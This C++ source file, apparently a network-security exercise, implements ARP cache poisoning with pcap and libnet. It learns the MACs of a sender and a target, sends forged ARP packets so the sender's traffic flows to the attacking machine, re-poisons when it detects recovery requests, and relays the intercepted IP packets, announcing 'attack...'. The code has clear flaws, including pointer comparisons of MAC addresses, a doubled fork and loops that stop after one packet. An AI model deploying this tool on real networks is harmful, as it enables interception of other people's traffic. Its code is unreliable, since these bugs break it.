#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <string.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <pcap/pcap.h>
#include <libnet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <net/if.h>

#define REQUEST 1
#define REPLY 2
#define MAC_SIZE 6
#define IP_SIZE 4

#pragma pack(push, 1)
struct EthArpPacket
{
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

EthArpPacket packet;

char myip[20];
unsigned char mymac[6];
unsigned char sendermac[6];
unsigned char targetmac[6];

void usage()
{
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int32_t getmyip(char *dev, char *myip)
{
	struct ifreq ifr;
	char myipstr[20];
	u_int32_t s;

	printf("getmyip start\n");
	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);
	ioctl(s, SIOCGIFADDR, &ifr);

	inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, myipstr, sizeof(struct sockaddr));
	printf("my IP address is %s\n", myipstr);
	memcpy(myip, myipstr, strlen(myipstr));
	printf("getmyip end\n");

	return 0;
}

void getmymac(char *dev, unsigned char *mymac)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);

	printf("getmymac start\n");

	memcpy(mymac, ifr.ifr_hwaddr.sa_data, 6);
	printf("my MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", mymac[0], mymac[1], mymac[2], mymac[3], mymac[4], mymac[5]);
	printf("getmymac end\n");
}

int sendarp(pcap_t *handle, char *sender_ip, char *target_ip, unsigned char *mymac, unsigned char *sendermac, uint16_t op)
{

	printf("sendarp start\n");
	if (op == REQUEST)
	{
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.op_ = htons(ArpHdr::Request);
	}
	else if (op == REPLY)
	{
		packet.eth_.dmac_ = Mac(sendermac);
		packet.arp_.tmac_ = Mac(sendermac);
		packet.arp_.op_ = htons(ArpHdr::Reply);
	}
	packet.eth_.smac_ = Mac(mymac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.smac_ = Mac(mymac);
	packet.arp_.sip_ = htonl(Ip(sender_ip));
	packet.arp_.tip_ = htonl(Ip(target_ip));

	if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket)) != 0)
	{
		fprintf(stderr, "couldn't send packet : %s\n", pcap_geterr(handle));
		return -1;
	}

	printf("send arp from '%s' to '%s'\n", sender_ip, target_ip);
	printf("my mac address: %02x:%02x:%02x:%02x:%02x:%02x\n", mymac[0], mymac[1], mymac[2], mymac[3], mymac[4], mymac[5]);
	printf("sender mac address: %02x:%02x:%02x:%02x:%02x:%02x\n", sendermac[0], sendermac[1], sendermac[2], sendermac[3], sendermac[4], sendermac[5]);

	printf("sendarp end\n");
	return 0;
}

int getsendermac(pcap_t *handle, char *myip, char *senderip, unsigned char *mymac, unsigned char *sendermac)
{
	printf("getsendermac start\n");
	while (true)
	{
		sendarp(handle, myip, senderip, mymac, sendermac, REQUEST);
		struct pcap_pkthdr *header;
		const u_char *_packet;

		int res = pcap_next_ex(handle, &header, &_packet);

		EthHdr *eth_ = (EthHdr *)_packet;

		ArpHdr *arp_ = (ArpHdr *)((uint8_t *)(_packet) + 14);

		memcpy(sendermac, (u_char *)arp_->smac_, 6);
		printf("sender mac addr: %02x:%02x:%02x:%02x:%02x:%02x\n", sendermac[0], sendermac[1], sendermac[2], sendermac[3], sendermac[4], sendermac[5]);
		printf("getsendermac end\n");
		return 1;
	}
	printf("getsendermac end\n");
	return 0;
}

int gettargetmac(pcap_t *handle, char *myip, char *targetip, unsigned char *mymac, unsigned char *targetmac)
{
	printf("gettargetmac start\n");
	while (true)
	{
		sendarp(handle, myip, targetip, mymac, targetmac, REQUEST);
		struct pcap_pkthdr *header;
		const u_char *_packet;

		int res = pcap_next_ex(handle, &header, &_packet);

		EthHdr *eth_ = (EthHdr *)_packet;

		ArpHdr *arp_ = (ArpHdr *)((uint8_t *)(_packet) + 14);

		memcpy(targetmac, (u_char *)arp_->smac_, 6);
		printf("target mac addr: %02x:%02x:%02x:%02x:%02x:%02x\n", targetmac[0], targetmac[1], targetmac[2], targetmac[3], targetmac[4], targetmac[5]);
		printf("gettargetmac end\n");
		return 1;
	}
	printf("gettargetmac end\n");
	return 0;
}

void arp_spoof(pcap_t *handle, char *myip, char *senderip, char *targetip, unsigned char *mymac, unsigned char *sendermac, unsigned char *targetmac)
{
	printf("in arp_spoof\n");
	while (true)
	{

		struct pcap_pkthdr *header;
		const u_char *packet;
		int res = pcap_next_ex(handle, &header, &packet);

		EthArpPacket received_arp;
		memcpy(&received_arp, packet, size_t(sizeof(EthArpPacket)));
		if (received_arp.eth_.type_ == htons(ETHERTYPE_ARP))
		{
			if (received_arp.arp_.sip_ == Ip(senderip) && received_arp.arp_.tip_ == Ip(targetip) && received_arp.arp_.smac_ == Mac(sendermac) && received_arp.arp_.op_ == htons(ARPOP_REQUEST))
			{
				printf("recover packet detected\n");
				sendarp(handle, senderip, targetip, mymac, sendermac, REPLY);
				continue;
			}
		}

		struct libnet_ethernet_hdr eth;
		memcpy(&eth, packet, LIBNET_ETH_H);
		if (eth.ether_type == htons(ETHERTYPE_IP))
		{
			if (eth.ether_shost == (uint8_t *)sendermac && eth.ether_dhost == (uint8_t *)mymac)
			{
				printf("packet from sender(%d bytes)\n", header->caplen);
				unsigned char *relay_packet = (unsigned char *)calloc(header->caplen + 1, sizeof(unsigned char));
				memcpy(relay_packet, packet, header->caplen);
				memcpy(relay_packet, targetmac, MAC_SIZE);
				memcpy(relay_packet + 6, mymac, MAC_SIZE);
				int res = pcap_sendpacket(handle, (const unsigned char *)relay_packet, header->caplen);
				if (res != 0)
					fprintf(stderr, "pcap_sendpacket return %d error = %s\n", res, pcap_geterr(handle));
				free(relay_packet);
			}
		}
	}
}

int main(int argc, char *argv[])
{
	if ((argc < 4) || (argc % 2 != 0))
	{
		usage();
		return -1;
	}

	char *dev = argv[1];
	char *senderip;
	char *targetip;

	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	getmyip(dev, myip);
	getmymac(dev, mymac);

	EthArpPacket packet;

	for (int i = 1; i < argc / 2; i++)
	{
		senderip = argv[2 * i];
		targetip = argv[2 * i + 1];

		pid_t pid;
		pid = fork();
		pid = fork();

		if (pid < 0)
		{
			printf("error\n");
		}
		else
		{
			getsendermac(handle, myip, senderip, mymac, sendermac);

			gettargetmac(handle, myip, targetip, mymac, targetmac);

			sendarp(handle, senderip, targetip, mymac, sendermac, REQUEST);

			printf("\n attack...\n");

			arp_spoof(handle, myip, senderip, targetip, mymac, sendermac, targetmac);
		}
	}

	pcap_close(handle);
}
